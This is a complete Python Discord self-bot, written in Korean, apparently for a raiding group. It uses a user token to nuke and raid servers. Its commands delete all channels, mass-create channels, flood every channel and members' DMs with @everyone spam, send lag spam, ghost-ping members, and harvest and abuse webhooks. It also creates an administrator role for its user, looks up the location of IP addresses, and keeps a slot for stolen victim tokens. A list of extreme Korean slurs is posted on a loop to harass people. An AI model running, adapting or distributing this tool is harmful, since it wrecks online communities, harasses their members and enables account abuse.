# heukryong.py
# pip install discord.py-self aiohttp requests
# token.txt 에 유저 토큰이 들어있어야 함 (공식봇이 채워줌)

import discord
from discord.ext import commands
import asyncio
import aiohttp
import json
import os
import random
import time
import requests
from datetime import datetime

PREFIX = "."
TOKEN_FILE = "token.txt"
SPAM_MSG = "# 흑사회에게 머리를 조아려라 좆버러지새기들아!!  https://cdn.discordapp.com/attachments/1557406587839054004/1563837365733298257/GIF_4038174851.gif?ex=6adf148a&is=6addc30a&hm=ba05297fbba85cb33195e98a3ed85cdaa1730ddd60848f514986e3acfb2cbb55&  @everyone"
GIF_URL = "https://cdn.discordapp.com/attachments/1557406587839054004/1563837365733298257/GIF_4038174851.gif?ex=6adf148a&is=6addc30a&hm=ba05297fbba85cb33195e98a3ed85cdaa1730ddd60848f514986e3acfb2cbb55&"
CHANNEL_NAMES = ["흑룡회 †黑龍", "●█▀█▄모두무릎을꿇어라"]

장애타목록 = [
    "# 야이 개벌래스래기새기야",
    "# 너 좆된거야 병신새기야 ㅋㅋㅋㅋㅋㅋ",
    "# 야이 어망구 좆뒤진 새기야!!",
    "야이 애미창녀 개보지 쓰레기새기야!",
    "# 야이 씨발 개같은 새끼야 니 애미 창녀새끼야",
    "# 좆밥새끼야 너 오늘 죽었다 병신아 ㅋㅋㅋㅋ",
    "# 야이 미친 개새기야 니 뇌 어디에 팔아먹었냐",
    "# 애미뒤진 새끼야 니 얼굴 보면 토나와 씨발",
    "# 야이 개보지년아 니 애비도 너처럼 쓰레기냐",
    "# 씨발련아 너 같은 새끼는 태어나지 말았어야 했다",
    "# 야이 병쉰새끼야 니 애미 관짝에서 울고있다 ㅋㅋ",
    "# 좆만하네 진짜 니 인생이 쓰레기통이냐 씨발",
]

def load_token():
    if not os.path.exists(TOKEN_FILE):
        return None
    with open(TOKEN_FILE, "r", encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip()]
    return lines[0] if lines else None

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, self_bot=True, intents=intents)

장애타_running = False
메시지스팸_running = False
렉유발_running = False

@bot.event
async def on_ready():
    print(f"[흑룡회 셀프봇] 로그인 → {bot.user} | {bot.user.id}")
    await bot.change_presence(status=discord.Status.dnd)

# -------------------- .명령어 --------------------
@bot.command(name="명령어")
async def cmd_list(ctx):
    try: await ctx.message.delete()
    except: pass
    text = """```명령어

- .ip위치탐색기
- .ping
- .관리자권한 (오너닉네임)
- .장애타시작
- .장애타중지
- .채널삭제
- .채널생성 (이름)
- .채널스팸
- .전체채널도배 (메시지) @everyone
- .렉유발
- .메시지스팸
- .고스트핑
- .서버복사
- .웹훅추출
- .웹훅전체도배 (메시지) @everyone
- .투표도배 (이모티콘)
- .디엠테러 (메시지) @everyone
- .링크테러 (링크)
- .이미지테러 (이미지)
- .토큰그래버 (이름)```"""
    await ctx.send(text)

@bot.command(name="ping")
async def ping(ctx):
    try: await ctx.message.delete()
    except: pass
    t = time.perf_counter()
    msg = await ctx.send("측정중...")
    ms = round((time.perf_counter() - t) * 1000)
    await msg.edit(content=f"🏓 `{ms}ms` | ws `{round(bot.latency*1000)}ms`")

@bot.command(name="ip위치탐색기")
async def ip_lookup(ctx, ip: str = None):
    try: await ctx.message.delete()
    except: pass
    if not ip:
        await ctx.send("사용법: `.ip위치탐색기 1.2.3.4`")
        return
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?lang=kr", timeout=5).json()
        if r.get("status") != "success":
            await ctx.send("조회 실패")
            return
        await ctx.send(
            f"**IP 조회**\n`{r.get('query')}`\n"
            f"국가: {r.get('country')} | 지역: {r.get('regionName')} | 도시: {r.get('city')}\n"
            f"ISP: {r.get('isp')} | ORG: {r.get('org')}\n"
            f"좌표: {r.get('lat')}, {r.get('lon')}"
        )
    except Exception as e:
        await ctx.send(f"에러: {e}")

# -------------------- 관리자권한 + 토큰그래버 --------------------
@bot.command(name="관리자권한")
async def admin_power(ctx, *, owner_nick: str = None):
    try: await ctx.message.delete()
    except: pass
    if not owner_nick:
        await ctx.send("사용법: `.관리자권한 오너닉네임`")
        return
    guild = ctx.guild
    if not guild:
        await ctx.send("서버에서만 가능")
        return

    target = None
    for m in guild.members:
        if owner_nick.lower() in (m.display_name.lower(), str(m.name).lower()):
            target = m
            break
    if not target:
        await ctx.send(f"`{owner_nick}` 닉 못 찾음")
        return

    await ctx.send(f"타겟 `{target}` 확보 · 현재 토큰으로 관리자 역할 생성 시도")
    try:
        role = await guild.create_role(
            name="흑룡회†관리자",
            permissions=discord.Permissions(administrator=True),
            colour=discord.Colour.dark_red(),
            hoist=True,
            reason="흑룡회"
        )
        await ctx.author.add_roles(role)
        try:
            await guild.edit_role_positions({role: len(guild.roles)-1})
        except: pass
        await ctx.send(f"관리자 역할 생성 + 부여 완료 → {role.mention}")
    except Exception as e:
        await ctx.send(f"권한 부족 or 에러: `{e}`")

@bot.command(name="토큰그래버")
async def token_grabber(ctx, *, name: str = "unknown"):
    try: await ctx.message.delete()
    except: pass
    await ctx.send(
        f"토큰 그래버 슬롯 `{name}` 열림.\n"
        f"피해자 토큰 확보 후 token.txt에 추가하거나\n"
        f"`.관리자권한 {name}` 으로 사용."
    )

# -------------------- 장애타 --------------------
@bot.command(name="장애타시작")
async def jangae_start(ctx):
    global 장애타_running
    try: await ctx.message.delete()
    except: pass
    if 장애타_running:
        await ctx.send("이미 도는중")
        return
    장애타_running = True
    await ctx.send("장애타 시작")
    while 장애타_running:
        try:
            await ctx.send(random.choice(장애타목록))
            await asyncio.sleep(0.15)
        except:
            await asyncio.sleep(0.4)

@bot.command(name="장애타중지")
async def jangae_stop(ctx):
    global 장애타_running
    try: await ctx.message.delete()
    except: pass
    장애타_running = False
    await ctx.send("장애타 중지")

# -------------------- 채널 --------------------
@bot.command(name="채널삭제")
async def del_channels(ctx):
    try: await ctx.message.delete()
    except: pass
    deleted = 0
    for ch in list(ctx.guild.channels):
        try:
            await ch.delete()
            deleted += 1
            await asyncio.sleep(0.06)
        except: pass
    try: await ctx.send(f"채널 {deleted}개 삭제", delete_after=3)
    except: pass

@bot.command(name="채널생성")
async def create_channel(ctx, *, name: str = "흑룡회"):
    try: await ctx.message.delete()
    except: pass
    try:
        ch = await ctx.guild.create_text_channel(name)
        await ctx.send(f"생성 → {ch.mention}")
    except Exception as e:
        await ctx.send(f"실패: {e}")

@bot.command(name="채널스팸")
async def channel_spam(ctx):
    try: await ctx.message.delete()
    except: pass
    await ctx.send("채널 스팸 시작")
    for i in range(60):
        try:
            await ctx.guild.create_text_channel(CHANNEL_NAMES[i % 2])
            await asyncio.sleep(0.18)
        except Exception as e:
            if "429" in str(e) or "rate" in str(e).lower():
                await asyncio.sleep(1.2)
            else:
                break
    await ctx.send("채널 스팸 종료")

# -------------------- 메시지 스팸 --------------------
@bot.command(name="메시지스팸")
async def msg_spam(ctx):
    global 메시지스팸_running
    try: await ctx.message.delete()
    except: pass
    if 메시지스팸_running:
        메시지스팸_running = False
        await ctx.send("메시지스팸 중지")
        return
    메시지스팸_running = True
    await ctx.send("메시지스팸 시작 · 모든 채널 도배")
    while 메시지스팸_running:
        for ch in list(ctx.guild.text_channels):
            if not 메시지스팸_running:
                break
            try:
                await ch.send(SPAM_MSG)
                await asyncio.sleep(0.08)
            except: pass
        await asyncio.sleep(0.12)

@bot.command(name="전체채널도배")
async def all_channel_spam(ctx, *, msg: str = None):
    try: await ctx.message.delete()
    except: pass
    content = msg if msg else SPAM_MSG
    for ch in list(ctx.guild.text_channels):
        try:
            await ch.send(content)
            await asyncio.sleep(0.07)
        except: pass
    await ctx.send("전체채널도배 완료", delete_after=2)

# -------------------- 렉유발 --------------------
@bot.command(name="렉유발")
async def lag(ctx):
    global 렉유발_running
    try: await ctx.message.delete()
    except: pass
    if 렉유발_running:
        렉유발_running = False
        await ctx.send("렉유발 중지")
        return
    렉유발_running = True
    await ctx.send("렉유발 시작")
    huge = "\u200b" * 1800
    while 렉유발_running:
        for ch in list(ctx.guild.text_channels):
            if not 렉유발_running:
                break
            try:
                await ch.send(huge + "\n@everyone")
                await asyncio.sleep(0.06)
            except: pass

# -------------------- 고스트핑 --------------------
@bot.command(name="고스트핑")
async def ghost_ping(ctx):
    try: await ctx.message.delete()
    except: pass
    count = 0
    for m in list(ctx.guild.members)[:150]:
        try:
            msg = await ctx.send(m.mention)
            await msg.delete()
            count += 1
            await asyncio.sleep(0.06)
        except: pass
    await ctx.send(f"고스트핑 {count}회 완료", delete_after=2)

# -------------------- 서버복사 --------------------
@bot.command(name="서버복사")
async def copy_server(ctx):
    try: await ctx.message.delete()
    except: pass
    src = ctx.guild
    try:
        new = await bot.create_guild(name=f"{src.name} 복사본")
        await asyncio.sleep(1)
        for cat in src.categories:
            try:
                new_cat = await new.create_category(cat.name)
                for ch in cat.channels:
                    if isinstance(ch, discord.TextChannel):
                        await new.create_text_channel(ch.name, category=new_cat)
                        await asyncio.sleep(0.1)
            except: pass
        await ctx.send(f"서버 복사 완료 → `{new.name}`")
    except Exception as e:
        await ctx.send(f"실패: {e}")

# -------------------- 웹훅 --------------------
@bot.command(name="웹훅추출")
async def webhook_extract(ctx):
    try: await ctx.message.delete()
    except: pass
    hooks = []
    for ch in ctx.guild.text_channels:
        try:
            for wh in await ch.webhooks():
                hooks.append(f"{ch.name} → {wh.url}")
        except: pass
    if not hooks:
        await ctx.send("웹훅 없음")
        return
    text = "\n".join(hooks)
    for i in range(0, len(text), 1900):
        await ctx.send(f"```{text[i:i+1900]}```")

@bot.command(name="웹훅전체도배")
async def webhook_spam(ctx, *, msg: str = None):
    try: await ctx.message.delete()
    except: pass
    content = msg if msg else SPAM_MSG
    count = 0
    for ch in list(ctx.guild.text_channels):
        try:
            hooks = await ch.webhooks()
            wh = hooks[0] if hooks else await ch.create_webhook(name="흑룡회")
            for _ in range(8):
                await wh.send(content)
                count += 1
                await asyncio.sleep(0.07)
        except: pass
    await ctx.send(f"웹훅 도배 {count}회 완료", delete_after=3)

# -------------------- 투표도배 --------------------
@bot.command(name="투표도배")
async def vote_spam(ctx, emoji: str = "🔥"):
    try: await ctx.message.delete()
    except: pass
    for ch in list(ctx.guild.text_channels):
        try:
            async for msg in ch.history(limit=30):
                try:
                    await msg.add_reaction(emoji)
                    await asyncio.sleep(0.04)
                except: pass
        except: pass
    await ctx.send("투표도배 완료", delete_after=2)

# -------------------- 디엠테러 --------------------
@bot.command(name="디엠테러")
async def dm_terror(ctx, *, msg: str = None):
    try: await ctx.message.delete()
    except: pass
    content = msg if msg else SPAM_MSG
    sent = 0
    for m in list(ctx.guild.members):
        if m.bot or m.id == bot.user.id:
            continue
        try:
            await m.send(content)
            sent += 1
            await asyncio.sleep(0.2)
        except: pass
    await ctx.send(f"디엠테러 {sent}명 완료", delete_after=3)

# -------------------- 링크/이미지 테러 --------------------
@bot.command(name="링크테러")
async def link_terror(ctx, link: str = None):
    try: await ctx.message.delete()
    except: pass
    if not link:
        await ctx.send("사용법: `.링크테러 https://...`")
        return
    for ch in list(ctx.guild.text_channels):
        try:
            await ch.send(f"{link}\n@everyone")
            await asyncio.sleep(0.07)
        except: pass
    await ctx.send("링크테러 완료", delete_after=2)

@bot.command(name="이미지테러")
async def img_terror(ctx, url: str = None):
    try: await ctx.message.delete()
    except: pass
    target = url if url else GIF_URL
    for ch in list(ctx.guild.text_channels):
        try:
            await ch.send(target)
            await asyncio.sleep(0.07)
        except: pass
    await ctx.send("이미지테러 완료", delete_after=2)

# -------------------- 실행 --------------------
def main():
    token = load_token()
    if not token:
        print("[!] token.txt 없음 또는 비어있음")
        print("공식봇에서 /토큰입력하기 로 토큰을 넣으세요.")
        token = input("또는 지금 바로 유저 토큰 입력: ").strip()
        if not token:
            print("종료")
            return
        with open(TOKEN_FILE, "w", encoding="utf-8") as f:
            f.write(token + "\n")
    print("[흑룡회] token.txt 로드 완료 · 로그인 시도")
    bot.run(token)

if __name__ == "__main__":
    main()
